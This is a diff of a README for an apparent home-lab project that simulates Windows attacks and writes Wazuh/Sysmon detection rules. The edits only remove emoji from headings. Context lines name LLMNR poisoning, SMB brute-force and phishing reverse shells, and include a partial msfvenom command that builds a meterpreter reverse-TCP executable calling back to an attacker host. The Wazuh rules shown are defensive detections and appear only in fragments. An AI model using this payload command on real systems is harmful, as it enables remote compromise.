@@ -6,9 +6,9 @@
 
 ---
 
-## 🔍 Simulated Attacks
+## Simulated Attacks
 
-### 🧨 1. LLMNR Poisoning & NTLMv2 Hash Capture
+### 1. LLMNR Poisoning & NTLMv2 Hash Capture
 
 **Tools:** Responder, Kali Linux, Windows VM
 
@@ -25,7 +25,7 @@ sudo apt install responder -y
 
 ---
 
-### 🔐 2. SMB Brute-force & Reverse Shell
+### 2. SMB Brute-force & Reverse Shell
 
 **Tools:** Metasploit
 
@@ -42,7 +42,7 @@ msfconsole
 
 ---
 
-### 🎣 3. Phishing-based Reverse Shell
+### 3. Phishing-based Reverse Shell
 
 **Tools:** `msfvenom`, Responder server, browser
 
@@ -57,9 +57,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe > 
 
 ---
 
-## 🛠️ Contributions
+##  Contributions
 
-### 🧾 Sysmon Setup
+### Sysmon Setup
 
 1. Install Sysmon and config (`sysmonconfig.xml`)
 2. Example filtering:
@@ -76,15 +76,15 @@ Sysmon64.exe -c
 
 ---
 
-## 📜 Wazuh Rule Development
+##  Wazuh Rule Development
 
-### 🗂 Rule File
+### Rule File
 All rules live in:
 ```bash
 /var/ossec/etc/rules/local_rules.xml
 ```
 
-### 📋 Custom Lists
+###  Custom Lists
 Create lists in:
 ```bash
 /var/ossec/etc/lists
@@ -94,9 +94,9 @@ Then include them in `ossec.conf`.
 
 ---
 
-## 🧠 Example Rules
+##  Example Rules
 
-### 🔎 LLMNR Detection
+###  LLMNR Detection
 ```xml
 <rule id="111122" level="10">
   <if_group>sysmon_event3</if_group>
@@ -107,7 +107,7 @@ Then include them in `ossec.conf`.
 </rule>
 ```
 
-### 📦 SMB Detection
+###  SMB Detection
 ```xml
 <rule id="111124" level="10">
   <if_group>sysmon_event3</if_group>
@@ -117,7 +117,7 @@ Then include them in `ossec.conf`.
 </rule>
 ```
 
-### 🧠 Correlated LLMNR + SMB
+### Correlated LLMNR + SMB
 ```xml
 <rule id="111128" level="15" timeframe="10">
   <if_sid>111123</if_sid>
@@ -126,7 +126,7 @@ Then include them in `ossec.conf`.
 </rule>
 ```
 
-### 🛑 Unauthorized Remote Login
+### Unauthorized Remote Login
 ```xml
 <rule id="111130" level="13">
   <if_sid>92651</if_sid>
@@ -136,7 +136,7 @@ Then include them in `ossec.conf`.
 </rule>
 ```
 
-### 📤 Reverse Shell Detection
+###  Reverse Shell Detection
 ```xml
 <rule id="111144" level="15" timeframe="20">
   <if_sid>111141</if_sid>
@@ -147,7 +147,7 @@ Then include them in `ossec.conf`.
 
 ---
 
-## 📁 Directory Structure
+## Directory Structure
 
 ```
 /var/ossec/
